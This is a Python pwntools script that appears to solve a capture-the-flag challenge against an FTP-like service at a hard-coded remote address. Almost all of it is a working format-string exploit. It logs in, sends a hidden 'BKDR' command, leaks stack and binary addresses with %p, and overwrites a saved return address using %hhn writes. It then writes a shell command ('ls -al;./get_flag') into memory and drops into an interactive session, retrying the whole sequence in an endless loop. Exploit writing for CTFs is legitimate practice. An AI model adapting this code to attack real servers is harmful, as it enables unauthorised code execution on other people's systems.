from pwn import *
from termcolor import colored

text = colored(' DEBUG ', 'red', attrs=['reverse', 'blink', 'bold'])
# context.log_level = 'DEBUG'
DEBUG = 0
file = './chall'
exe  = ELF(file)


def get_flag(io):
    payload = b"RETR get_flag"
    io.sendline(payload)
    # recv = io.recvuntil(b"dir changed")
    recv = io.recvuntil(b"226 Transfer")
    data = (recv[:-12])
    # print(data)
    file = open("get_flag", "wb")
    file.write(data)

def append_character(io, c, offset, target_buffer):
    if (ord(c) <= ord('r')):
        payload = f"BKDR    %{ord(c) - 15}x%1033$hhn".encode()
        payload = payload + p64(target_buffer + offset)
        io.sendline(payload)
        io.recvuntil(b"BKDR")
        io.recv()
    else:
        payload = f"BKDR   %{ord(c) - 14}x%1033$hhn".encode()
        payload = payload + p64(target_buffer + offset)
        io.sendline(payload)
        io.recvuntil(b"BKDR")
        io.recv()

def run_command(io, command, target_buffer):
    i = 0
    for c in command:
        append_character(io, c, i, target_buffer)
        info("Send character[%d]:   %s"   % (i, c))
        i += 1

def main():
    # declared
    # exploit             0x7fffffffdf60   -   0x7fffffff78a0 = 0x66c0
    if DEBUG:
        libc = ELF('libc.so.6')
        #env = {'LD_PRELOAD': os.path.join(os.getcwd(), 'libc.so.6')}
        #io = process([os.path.join(os.getcwd(), 'ld-linux.so.2'), file], env=env)
        io = process(file)
        input(text)
    else:
        libc = ELF('./libc.so.6')
        io = remote('159.65.62.99', 31410)

    # login first
    username = b";)"
    io.sendline(b"user %s" % username)

    io.recvuntil(b"password")
    io.recv()

    password = b";)"
    io.sendline(b"pass %s" % password)

    io.recvuntil(b"proceed")
    io.recv()

    payload = b"BKDR " + b"%p "*4 + b"%2737$p"
    io.sendline(payload)
    
    io.recvuntil(b"BKDR")
    recv = io.recvuntil(b"\r\n")

    leak_stack_addr = (recv.strip().split(b" ")[-2]).decode()
    leak_stack_addr = int(leak_stack_addr, 16)
    log.info("leaked address:   %#x"    % leak_stack_addr)

    saved_eip = (recv.strip().split(b" ")[-1]).decode()
    saved_eip = int(saved_eip, 16)
    log.info("Saved EIP:   %#x"    % saved_eip)

    binary_base = saved_eip - 0x3a10
    info("Binary base:      %#x"    % binary_base)

    target_return_addr = binary_base + 0x30C9
    info("target return address:    %#x"   % target_return_addr)

    last2byte = hex(target_return_addr % 0x10000)

    first_byte = int(last2byte[4:6], 16)
    second_byte = int(last2byte[2:4], 16)

    target_addr = leak_stack_addr + 0x66c0
    log.info("target address:   %#x"    % target_addr)

    stack_ret_addr = leak_stack_addr + 0x66d8

    payload = b"BKDR   %1033$n%1034$n" + p64(target_addr) + p64(target_addr + 4)
    io.sendline(payload)
    io.recvuntil(b"BKDR")
    io.recv()

    # payload = f"BKDR       %{second_byte-18}x%1035$hhn%{first_byte-second_byte}x%1036$hhn".encode()
    # payload = payload + p64(stack_ret_addr + 1) + p64(stack_ret_addr)
    # io.sendline(payload)
    # io.recvuntil(b"BKDR")
    # io.recv()

    payload = f"BKDR    %{second_byte - 15}x%1033$hhn".encode()
    payload = payload + p64(stack_ret_addr + 1)
    io.sendline(payload)
    io.recvuntil(b"BKDR")
    io.recv()

    payload = f"BKDR   %{first_byte - 14}x%1033$hhn".encode()
    payload = payload + p64(stack_ret_addr)
    io.sendline(payload)
    io.recvuntil(b"BKDR")
    io.recv()

    target_buffer = leak_stack_addr + 0x4680
    
    run_command(io, "ls -al;./get_flag", target_buffer)

    payload = b"QUIT"
    io.sendline(payload)    
    io.interactive()

if __name__ == '__main__':
    while True:
        try:
            main()
        except:
            pass